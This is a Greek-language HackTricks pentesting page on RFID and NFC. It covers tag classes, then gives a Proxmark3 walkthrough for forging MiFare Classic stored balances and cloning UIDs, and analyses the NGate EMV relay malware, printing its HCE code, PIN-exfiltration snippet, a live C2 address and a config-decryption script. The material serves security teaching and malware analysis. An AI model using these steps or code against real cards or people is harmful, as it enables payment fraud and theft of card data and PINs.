# Pentesting RFID

{{#include ../../banners/hacktricks-training.md}}

## Εισαγωγή

**Radio Frequency Identification (RFID)** είναι η πιο δημοφιλής λύση μικρής εμβέλειας μέσω ραδιοσυχνοτήτων. Συνήθως χρησιμοποιείται για την αποθήκευση και μετάδοση πληροφοριών που ταυτοποιούν μια οντότητα.

Ένα RFID tag μπορεί να βασίζεται σε **δική του πηγή τροφοδοσίας (active)**, όπως μια ενσωματωμένη μπαταρία, ή να λαμβάνει την ισχύ του από την κεραία ανάγνωσης χρησιμοποιώντας το ρεύμα **επαγόμενο από τα ληφθέντα ραδιοκύματα** (**passive**).

### Classes

Η EPCglobal χωρίζει τα RFID tags σε έξι κατηγορίες. Ένα tag σε κάθε κατηγορία έχει όλες τις δυνατότητες της προηγούμενης κατηγορίας, καθιστώντας το συμβατό προς τα πίσω.

- **Class 0** tags είναι **passive** tags που λειτουργούν σε **UHF** μπάντες. Ο προμηθευτής τα **προ-προγραμματίζει** στο εργοστάσιο παραγωγής. Έτσι, **δεν μπορείτε να αλλάξετε** τις πληροφορίες που είναι αποθηκευμένες στη μνήμη τους.
- **Class 1** tags μπορούν επίσης να λειτουργούν σε **HF** μπάντες. Επιπλέον, μπορούν να **γραφτούν μόνο μία φορά** μετά την παραγωγή. Πολλά Class 1 tags μπορούν επίσης να επεξεργάζονται **cyclic redundancy checks (CRCs)** των εντολών που λαμβάνουν. Τα CRCs είναι μερικά επιπλέον bytes στο τέλος των εντολών για ανίχνευση σφαλμάτων.
- **Class 2** tags μπορούν να **γραφτούν πολλές φορές**.
- **Class 3** tags μπορούν να περιέχουν **ενσωματωμένους αισθητήρες** που μπορούν να καταγράφουν περιβαλλοντικές παραμέτρους, όπως την τρέχουσα θερμοκρασία ή την κίνηση του tag. Αυτά τα tags είναι **semi-passive**, επειδή παρότι **έχουν** ενσωματωμένη πηγή τροφοδοσίας, όπως μια **μπαταρία**, **δεν μπορούν να ξεκινήσουν** ασύρματη **επικοινωνία** με άλλα tags ή readers.
- **Class 4** tags μπορούν να ξεκινήσουν επικοινωνία με άλλα tags της ίδιας κλάσης, καθιστώντας τα **active tags**.
- **Class 5** tags μπορούν να παρέχουν **ισχύ σε άλλα tags και να επικοινωνούν με όλες τις προηγούμενες κλάσεις** tags. Τα Class 5 tags μπορούν να λειτουργήσουν ως **RFID readers**.

### Πληροφορίες αποθηκευμένες σε RFID Tags

Η μνήμη ενός RFID tag συνήθως αποθηκεύει τέσσερις τύπους δεδομένων: τα **identification data**, που **ταυτοποιούν** την **οντότητα** στην οποία είναι προσκολλημένο το tag (αυτά τα δεδομένα περιλαμβάνουν πεδία ορισμένα από τον χρήστη, όπως τραπεζικοί λογαριασμοί); τα **supplementary data**, που παρέχουν **επιπλέον** **λεπτομέρειες** σχετικά με την οντότητα; τα **control data**, που χρησιμοποιούνται για την εσωτερική **διαμόρφωση** του tag; και τα **manufacturer data** του tag, που περιέχουν το Unique Identifier (**UID**) του tag και λεπτομέρειες σχετικά με την **παραγωγή**, **τύπο** και **προμηθευτή** του tag. Θα βρείτε τους πρώτους δύο τύπους δεδομένων σε όλα τα εμπορικά tags· οι δύο τελευταίοι μπορεί να διαφέρουν ανάλογα με τον προμηθευτή του tag.

Το πρότυπο ISO καθορίζει την τιμή Application Family Identifier (**AFI**), έναν κωδικό που υποδεικνύει τον **τύπο αντικειμένου** στο οποίο ανήκει το tag. Ένας άλλος σημαντικός καταχωρητής, επίσης ορισμένος από το ISO, είναι το Data Storage Format Identifier(**DSFID**), που ορίζει την **λογική οργάνωση των δεδομένων χρήστη**.

Οι περισσότερες **μέθοδοι ασφάλειας** σε RFID έχουν μηχανισμούς που **περιορίζουν** τις ενέργειες **read** ή **write** σε κάθε μπλοκ μνήμης χρήστη και στους ειδικούς καταχωρητές που περιέχουν τις τιμές AFI και DSFID. Αυτοί οι **μηχανισμοί κλειδώματος** χρησιμοποιούν δεδομένα αποθηκευμένα στη μνήμη ελέγχου και έχουν **προεπιλεγμένους κωδικούς** ρυθμισμένους από τον προμηθευτή, αλλά επιτρέπουν στους ιδιοκτήτες των tags να **διαμορφώσουν προσαρμοσμένους κωδικούς**.

### Σύγκριση Low & High frequency tags

<figure><img src="../../images/image (983).png" alt=""><figcaption></figcaption></figure>

## Low-Frequency RFID Tags (125kHz)

Τα **low-frequency tags** χρησιμοποιούνται συχνά σε συστήματα που **δεν απαιτούν υψηλή ασφάλεια**: πρόσβαση σε κτίρια, κλειδιά θυροτηλεφώνων, κάρτες γυμναστηρίου κ.λπ. Λόγω της μεγαλύτερης εμβέλειάς τους, είναι βολικά για πληρωμένη στάθμευση αυτοκινήτων: ο οδηγός δεν χρειάζεται να φέρει την κάρτα πολύ κοντά στον reader, καθώς ενεργοποιείται από μεγαλύτερη απόσταση. Ταυτόχρονα, τα low-frequency tags είναι πολύ πρωτόγονα, έχουν χαμηλό ρυθμό μεταφοράς δεδομένων. Για αυτόν τον λόγο, είναι αδύνατο να υλοποιηθεί πολύπλοκη αμφίδρομη μεταφορά δεδομένων για πράγματα όπως χρηματικά υπόλοιπα και κρυπτογραφία. Τα low-frequency tags μόνο μεταδίδουν το σύντομο ID τους χωρίς κανένα μέσο αυθεντικοποίησης.

Αυτές οι συσκευές βασίζονται σε **passive** **RFID** τεχνολογία και λειτουργούν σε **εύρος 30 kHz έως 300 kHz**, αν και είναι πιο συνηθισμένο να χρησιμοποιούνται 125 kHz έως 134 kHz:

- **Μεγάλη εμβέλεια** — χαμηλότερη συχνότητα μεταφράζεται σε μεγαλύτερη εμβέλεια. Υπάρχουν μερικοί readers EM-Marin και HID που λειτουργούν από απόσταση έως και ενός μέτρου. Αυτοί χρησιμοποιούνται συχνά σε στάθμευση αυτοκινήτων.
- **Πρωτόκολλο πρωτόγονο** — λόγω του χαμηλού ρυθμού μεταφοράς δεδομένων, αυτά τα tags μπορούν μόνο να μεταδώσουν το σύντομο ID τους. Στις περισσότερες περιπτώσεις, τα δεδομένα δεν αυθεντικοποιούνται και δεν προστατεύονται με κανένα τρόπο. Μόλις η κάρτα βρεθεί εντός εμβέλειας του reader, αρχίζει απλά να μεταδίδει το ID της.
- **Χαμηλή ασφάλεια** — Αυτές οι κάρτες μπορούν να αντιγραφούν εύκολα, ή ακόμα και να διαβαστούν από την τσέπη κάποιου άλλου λόγω της πρωτόγονης φύσης του πρωτοκόλλου.

Δημοφιλή πρωτόκολλα 125 kHz:

- **EM-Marin** — EM4100, EM4102. Το πιο δημοφιλές πρωτόκολλο στην ΚΑΚ. Μπορεί να διαβαστεί από περίπου ένα μέτρο λόγω της απλότητάς του και της σταθερότητάς του.
- **HID Prox II** — πρωτόκολλο χαμηλής συχνότητας εισήχθη από την HID Global. Αυτό το πρωτόκολλο είναι πιο δημοφιλές στις δυτικές χώρες. Είναι πιο πολύπλοκο και οι κάρτες και οι readers για αυτό το πρωτόκολλο είναι σχετικά ακριβοί.
- **Indala** — πολύ παλιό πρωτόκολλο χαμηλής συχνότητας που εισήχθη από τη Motorola και αργότερα αποκτήθηκε από την HID. Είναι λιγότερο πιθανό να το συναντήσετε στην άγρια φύση σε σύγκριση με τα δύο προηγούμενα, καθώς εγκαταλείπεται.

Στην πραγματικότητα υπάρχουν πολλά περισσότερα low-frequency πρωτόκολλα. Αλλά όλα χρησιμοποιούν την ίδια διαμόρφωση στο φυσικό επίπεδο και μπορούν να θεωρηθούν, με τον ένα ή άλλο τρόπο, παραλλαγές αυτών που αναφέρονται παραπάνω.

### Attack

Μπορείτε να **attack** αυτά τα Tags με το Flipper Zero:


{{#ref}}
flipper-zero/fz-125khz-rfid.md
{{#endref}}

## High-Frequency RFID Tags (13.56 MHz)

Τα **high-frequency tags** χρησιμοποιούνται για πιο πολύπλοκη αλληλεπίδραση reader-tag όταν χρειάζεστε κρυπτογραφία, μεγάλη αμφίδρομη μεταφορά δεδομένων, αυθεντικοποίηση κ.λπ.\
Συνήθως βρίσκονται σε κάρτες τραπεζών, δημόσιας συγκοινωνίας και άλλα ασφαλή περάσματα.

Τα **high-frequency 13.56 MHz tags είναι ένα σύνολο προτύπων και πρωτοκόλλων**. Συνήθως αναφέρονται ως [NFC](https://nfc-forum.org/what-is-nfc/about-the-technology/), αλλά αυτό δεν είναι πάντα σωστό. Το βασικό σύνολο πρωτοκόλλων που χρησιμοποιείται στα φυσικά και λογικά επίπεδα είναι το ISO 14443. Πρωτόκολλα υψηλού επιπέδου, καθώς και εναλλακτικά πρότυπα (όπως το ISO 19092), βασίζονται σε αυτό. Πολλοί άνθρωποι αναφέρονται σε αυτήν την τεχνολογία ως **Near Field Communication (NFC)**, ένας όρος για συσκευές που λειτουργούν στη συχνότητα 13.56 MHz.

<figure><img src="../../images/image (930).png" alt=""><figcaption></figcaption></figure>

Για να το πούμε απλά, η αρχιτεκτονική του NFC λειτουργεί έτσι: το πρωτόκολλο μετάδοσης επιλέγεται από την εταιρεία που κατασκευάζει τις κάρτες και υλοποιείται πάνω στο χαμηλού επιπέδου ISO 14443. Για παράδειγμα, η NXP επινόησε το δικό της πρωτόκολλο μετάδοσης υψηλού επιπέδου που ονομάζεται Mifare. Αλλά σε χαμηλότερο επίπεδο, οι κάρτες Mifare βασίζονται στο πρότυπο ISO 14443-A.

Το Flipper μπορεί να αλληλεπιδράσει τόσο με το χαμηλού επιπέδου πρωτόκολλο ISO 14443, όσο και με το Mifare Ultralight πρωτόκολλο μεταφοράς δεδομένων και το EMV που χρησιμοποιείται σε τραπεζικές κάρτες. Εργαζόμαστε για την προσθήκη υποστήριξης για Mifare Classic και NFC NDEF. Μια διεξοδική επισκόπηση των πρωτοκόλλων και προτύπων που απαρτίζουν το NFC αξίζει ξεχωριστό άρθρο που σχεδιάζουμε να δημοσιεύσουμε αργότερα.

Όλες οι κάρτες high-frequency που βασίζονται στο πρότυπο ISO 14443-A έχουν ένα μοναδικό chip ID. Λειτουργεί ως ο σειριακός αριθμός της κάρτας, όπως η MAC διεύθυνση μιας δικτυακής κάρτας. **Συνήθως, το UID είναι 4 ή 7 bytes μακρύ**, αλλά σπάνια μπορεί να φτάσει **έως 10**. Τα UID δεν είναι μυστικά και διαβάζονται εύκολα, **μερικές φορές ακόμη και τυπωμένα στην ίδια την κάρτα**.

Υπάρχουν πολλά συστήματα ελέγχου πρόσβασης που βασίζονται στο UID για να **αυθεντικοποιούν και να χορηγούν πρόσβαση**. Μερικές φορές αυτό συμβαίνει **ακόμα και** όταν τα RFID tags **υποστηρίζουν κρυπτογραφία**. Τέτοια **κακή χρήση** τα κατεβάζει στο επίπεδο των απλών **125 kHz καρτών** όσον αφορά την **ασφάλεια**. Οι virtual κάρτες (όπως το Apple Pay) χρησιμοποιούν δυναμικό UID ώστε οι ιδιοκτήτες τηλεφώνων να μην ανοίγουν πόρτες με την εφαρμογή πληρωμών τους.

- **Μικρή εμβέλεια** — οι κάρτες high-frequency σχεδιάζονται ειδικά ώστε να πρέπει να τοποθετηθούν κοντά στον reader. Αυτό βοηθά επίσης στην προστασία της κάρτας από μη εξουσιοδοτημένες αλληλεπιδράσεις. Η μέγιστη εμβέλεια ανάγνωσης που καταφέραμε να επιτύχουμε ήταν περίπου 15 cm, και αυτό με custom-made high-range readers.
- **Προηγμένα πρωτόκολλα** — ρυθμοί μεταφοράς δεδομένων έως 424 kbps επιτρέπουν πολύπλοκα πρωτόκολλα με πλήρη αμφίδρομη μεταφορά δεδομένων. Το οποίο με τη σειρά του **επιτρέπει κρυπτογραφία**, μεταφορά δεδομένων, κ.λπ.
- **Υψηλή ασφάλεια** — οι contactless κάρτες high-frequency δεν υστερούν σε τίποτα έναντι των smart cards. Υπάρχουν κάρτες που υποστηρίζουν κρυπτογραφικά ισχυρούς αλγορίθμους όπως το AES και υλοποιούν ασύμμετρη κρυπτογραφία.

### Attack

Μπορείτε να **attack** αυτά τα Tags με το Flipper Zero:


{{#ref}}
flipper-zero/fz-nfc.md
{{#endref}}

Ή χρησιμοποιώντας το **proxmark**:


{{#ref}}
proxmark-3.md
{{#endref}}

### MiFare Classic offline stored-value tampering (broken Crypto1)

Όταν ένα σύστημα αποθηκεύει ένα χρηματικό υπόλοιπο απευθείας σε μια κάρτα MiFare Classic, συχνά μπορείτε να το παραποιήσετε επειδή το Classic χρησιμοποιεί το παρωχημένο cipher Crypto1 της NXP. Το Crypto1 έχει σπάσει εδώ και χρόνια, επιτρέποντας την ανάκτηση των κλειδιών τομέα και την πλήρη ανάγνωση/εγγραφή της μνήμης της κάρτας με συμβατικό υλικό (π.χ., Proxmark3).

Ανάλυση end-to-end (αφαιρεμένη):

1) Dump της αρχικής κάρτας και ανάκτηση κλειδιών
```bash
# Attempt all built-in Classic key recovery attacks and dump the card
hf mf autopwn
```
This typically recovers sector keys (A/B) and generates a full-card dump in the client dumps folder.

2) Εντοπίστε και κατανοήστε τα πεδία value/integrity

- Εκτελέστε νόμιμα top-ups στην αρχική κάρτα και πάρτε πολλαπλά dumps (πριν/μετά).
- Κάντε diff των δύο dumps για να εντοπίσετε τα blocks/bytes που αλλάζουν και που αντιπροσωπεύουν το balance και οποιαδήποτε πεδία integrity.
- Πολλές Classic υλοποιήσεις είτε χρησιμοποιούν την εγγενή "value block" κωδικοποίηση είτε φτιάχνουν δικά τους checksums (π.χ. XOR του balance με άλλο πεδίο και μια σταθερά). Αφού αλλάξετε το balance, υπολογίστε ξανά τα integrity bytes ανάλογα και βεβαιωθείτε ότι όλα τα διπλότυπα/συμπληρωμένα πεδία είναι συνεπή.

3) Εγγράψτε το τροποποιημένο dump σε ένα writable “Chinese magic” Classic tag
```bash
# Load a modified binary dump onto a UID-changeable Classic tag
hf mf cload -f modified.bin
```
4) Αντιγράψτε το αρχικό UID ώστε τα τερματικά να αναγνωρίσουν την κάρτα
```bash
# Set the UID on a UID-changeable tag (gen1a/gen2 magic)
hf mf csetuid -u <original_uid>
```
5) Χρήση σε τερματικά

Οι αναγνώστες που εμπιστεύονται το υπόλοιπο στην κάρτα και το UID θα αποδεχτούν την παραποιημένη κάρτα. Παρατηρήσεις από το πεδίο δείχνουν ότι πολλές εγκαταστάσεις περιορίζουν τα υπόλοιπα με βάση το πλάτος πεδίου (π.χ., 16-bit fixed-point).

Σημειώσεις

- Εάν το σύστημα χρησιμοποιεί native Classic value blocks, θυμηθείτε τη μορφή: value (4B) + ~value (4B) + value (4B) + block address + ~address. Όλα τα μέρη πρέπει να ταιριάζουν.
- Για custom formats με simple checksums, η differential analysis είναι ο ταχύτερος τρόπος για να εξαχθεί η συνάρτηση ακεραιότητας χωρίς reversing του firmware.
- Μόνο οι UID-changeable tags ("Chinese magic" gen1a/gen2) επιτρέπουν την εγγραφή στο block 0/UID. Κανονικές Classic κάρτες έχουν read-only UIDs.

Για πρακτικές εντολές Proxmark3, δείτε:


{{#ref}}
proxmark-3.md
{{#endref}}

### Κατασκευή Φορητού HID MaxiProx 125 kHz Mobile Cloner

Αν χρειάζεστε μια **long-range**, **battery-powered** λύση για συλλογή HID Prox® badges κατά τη διάρκεια red-team engagements, μπορείτε να μετατρέψετε τον επιτοίχιο αναγνώστη **HID MaxiProx 5375** σε έναν αυτόνομο cloner που χωράει σε σακίδιο. Ο πλήρης μηχανικός και ηλεκτρικός οδηγός είναι διαθέσιμος εδώ:


{{#ref}}
maxiprox-mobile-cloner.md
{{#endref}}

## NFC/EMV Relay μέσω Android Reader↔HCE Emitter

Classic EMV relay μπορεί να υλοποιηθεί με 2 Android συσκευές: ένας reader στην πλευρά του θύματος που καταγράφει live APDUs και PIN από μια πραγματική κάρτα, και ένας HCE emitter στην πλευρά του επιτιθέμενου στον τερματικό που προωθεί APDUs upstream. Το αναλυθέν NGate kit εκμεταλλεύεται νόμιμες Android NFC APIs και ένα απλό framed TCP C2 για να ορχηστρώσει real-time ATM cash-outs.

Βασικά δομικά στοιχεία

- Reader-mode app (victim): χρησιμοποιεί NFC reader APIs για να αναλύσει EMV (PAN/expiry/AIDs), εμφανίζει το scheme ανά AID, ζητάει το PIN και το εξάγει αμέσως.
- Emitter-mode app (ATM side): υλοποιεί Host Card Emulation (HCE) με `android:requireDeviceUnlock="false"` και ένα payment AID; η `processCommandApdu()` προωθεί APDUs στο C2 και επιστρέφει ελάχιστη απάντηση.
- Wire protocol: length-prefixed frames, περιοδικό keepalive; προαιρετικά TLS.

Android surface (Manifest/HCE)
```xml
<uses-permission android:name="android.permission.NFC"/>
<uses-permission android:name="android.permission.INTERNET"/>
<service android:name=".nfc.hce.ApduService"
android:permission="android.permission.BIND_NFC_SERVICE"
android:exported="true">
<intent-filter>
<action android:name="android.nfc.cardemulation.action.HOST_APDU_SERVICE"/>
<category android:name="android.intent.category.DEFAULT"/>
</intent-filter>
<meta-data android:name="android.nfc.cardemulation.host_apdu_service"
android:resource="@xml/hce"/>
</service>
```
Παράδειγμα hce.xml (χωρίς unlock + payment AID)
```xml
<host-apdu-service android:requireDeviceUnlock="false"
android:description="relay">
<aid-group android:category="other">
<aid-filter android:name="F001020304050607"/>
</aid-group>
<aid-group android:category="payment">
<aid-filter android:name="F001020304050607"/>
</aid-group>
</host-apdu-service>
```
Διαφανής relay endpoint (HCE)
```java
@Override public byte[] processCommandApdu(byte[] apdu, Bundle extras) {
Log.d("ApduService", "APDU-IN: " + toHex(apdu));
bus.forward(apdu); // send upstream to C2/reader
return new byte[0]; // empty response, pure relay endpoint
}
```
Εξαγωγή συμπερασμάτων για το EMV scheme από το AID (παραδείγματα)

- A000000004 → Mastercard
- A000000003 → Visa
- A000000658 → MIR
- A000000333 → UnionPay

Πρότυπο συλλογής PIN (UI θύματος)
```java
// Custom keypad publishes when required length (e.g., 4) is reached
if (pin.length() == 4) postDelayed(() -> bus.publish(pin), 100L);
// Network immediately exfiltrates via dedicated opcode
send(OP_PIN_REQ, pin.getBytes(StandardCharsets.UTF_8));
```
Framed C2 (cleartext παράδειγμα)

- Client→Server: int32 len | int32 opcode | body
- Server→Client: int32 len | body (opcode inside payload)
- Απόρριψη bodies > ~100 MiB; keepalive ~7s (PING)
```java
// send
out.writeInt(body.length); out.writeInt(op); out.write(body); out.flush();
// recv
int len = in.readInt(); byte[] body = new byte[len]; in.readFully(body);
```
Απόκρυψη config: cert-derived XOR

- Η native lib υπολογίζει ένα 32-byte κλειδί ως SHA‑256 του app signing certificate (DER).
- Η C2 config είναι σε ASCII‑hex στα assets (π.χ., `assets/____`), hex-decoded και XOR-ed με το κλειδί που επαναλαμβάνεται κάθε 32 bytes:
```c
for (size_t i = 0; i < len; i++) pt[i] = ct[i] ^ key[i & 31];
```
Offline PoC για την αποκρυπτογράφηση του config
```bash
# Extract signing cert digest
apksigner verify --print-certs sample.apk
# "Signer #1 certificate SHA-256 digest: <hex>"
```

```python
import pathlib
key = bytes.fromhex("<sha256_of_signing_cert>")
ct  = bytes.fromhex(pathlib.Path("/path/to/assets/____").read_text().strip())
pt  = bytes(c ^ key[i % 32] for i, c in enumerate(ct))
print(pt.decode("utf-8", errors="replace"))
```
Sample decrypted fields: `host`, `port`, `sharedToken`, `tls`, `mode`, `reader`, `uniqueID`, `ttd`.

Relay chain (end-to-end)

1) Victim installs APK, opens app → native init decrypts config from assets.
2) App connects to C2 (e.g., `91.84.97.13:5653`) using framed TCP; keepalive ~7s.
3) Victim taps card → reader extracts PAN/expiry/AIDs and sends CARD_DISCOVERED.
4) Victim enters PIN → keypad publishes and exfiltrates via PIN_REQ; server replies VALID/INVALID for UI only.
5) Attacker device at terminal runs HCE emitter relaying APDUs to the ATM and performs cash-out.

---

## References

- [https://blog.flipperzero.one/rfid/](https://blog.flipperzero.one/rfid/)
- [Let's Clone a Cloner – Part 3 (TrustedSec)](https://trustedsec.com/blog/lets-clone-a-cloner-part-3-putting-it-all-together)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [MIFARE security overview (Wikipedia)](https://en.wikipedia.org/wiki/MIFARE#Security)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [Analysis of NGate malware campaign (CERT-PL)](https://cert.pl/en/posts/2025/11/analiza-ngate/)
- [Android apksigner – verify/print-certs](https://developer.android.com/studio/command-line/apksigner)
- [Android Host Card Emulation (HCE) overview](https://developer.android.com/guide/topics/connectivity/nfc/hce)

{{#include ../../banners/hacktricks-training.md}}
